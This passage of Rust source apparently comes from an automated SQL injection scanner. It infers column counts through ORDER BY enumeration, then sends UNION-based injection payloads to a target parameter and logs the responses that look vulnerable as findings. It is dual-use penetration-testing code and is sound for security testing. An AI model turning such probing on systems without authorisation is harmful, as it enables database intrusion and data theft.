                warn!("ORDER BY 1 already errored — ORDER BY enumeration inconclusive");
                return None;
            }
            let inferred = i - 1;
            info!(inferred, "ORDER BY enumeration inferred column count");
            return Some(inferred);
        }
    }
    info!("ORDER BY enumeration found no error up to {MAX_ORDER_BY_COLS} — undetermined");
    None
}

#[allow(clippy::too_many_arguments)]
async fn test_union_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
) {
    let detector = UnionDetector::new();
    let baseline_body = baseline.representative_body_str();

    // Phase 0 — ORDER BY enumeration to reduce false positives.
    // If we successfully infer `n`, we test only `n` first. If that fails, we
    // still fall back to the heuristic list (excluding the already-tried `n`) to
    // keep coverage for edge cases where ORDER BY is WAF-filtered but UNION still works.
    let inferred = enumerate_columns_via_order_by(
        client, state, cancel, target, target_str, param, marker_set, &detector,
    )
    .await;

    let mut cols_to_try: Vec<usize> = Vec::new();
    let mut fallback = vec![3usize, 2, 4, 5];
    if let Some(n) = inferred {
        cols_to_try.push(n);
        // Keep fallback for resilience but avoid duplicate probe
        fallback.retain(|c| *c != n);
    } else {
        cols_to_try = fallback.clone();
        fallback.clear();
    }

    // Primary pass: inferred or heuristic
    for cols in &cols_to_try {
        if cancel.is_cancelled() {
            return;
        }
        let cols = *cols;
        let payloads = union_payloads_for(None, cols);
        for p in payloads.iter().take(1) {
            if cancel.is_cancelled() {
                return;
            }
            let (body, ms) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &p.payload, marker_set,
            )
            .await;
            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
            if r.is_vulnerable {
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Union,
                    r.confidence,
                    format!(
                        "union columns={:?} payload={} order_by_inferred={:?}",
                        r.columns, p.payload, inferred
                    ),
                );
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                return;
            }
        }
    }

    // Secondary pass: fallback heuristic if primary (inferred) yielded nothing
    for cols in fallback {
        if cancel.is_cancelled() {
            break;
        }
        let payloads = union_payloads_for(None, cols);
        for p in payloads.iter().take(1) {
            if cancel.is_cancelled() {
                break;
            }
            let (body, ms) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &p.payload, marker_set,
            )
            .await;
            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols);
            if r.is_vulnerable {
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Union,
                    r.confidence,
                    format!(
                        "union columns={:?} payload={} order_by_inferred={:?} (fallback)",
                        r.columns, p.payload, inferred
                    ),
                );
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                return;
            }
        }
    }
}
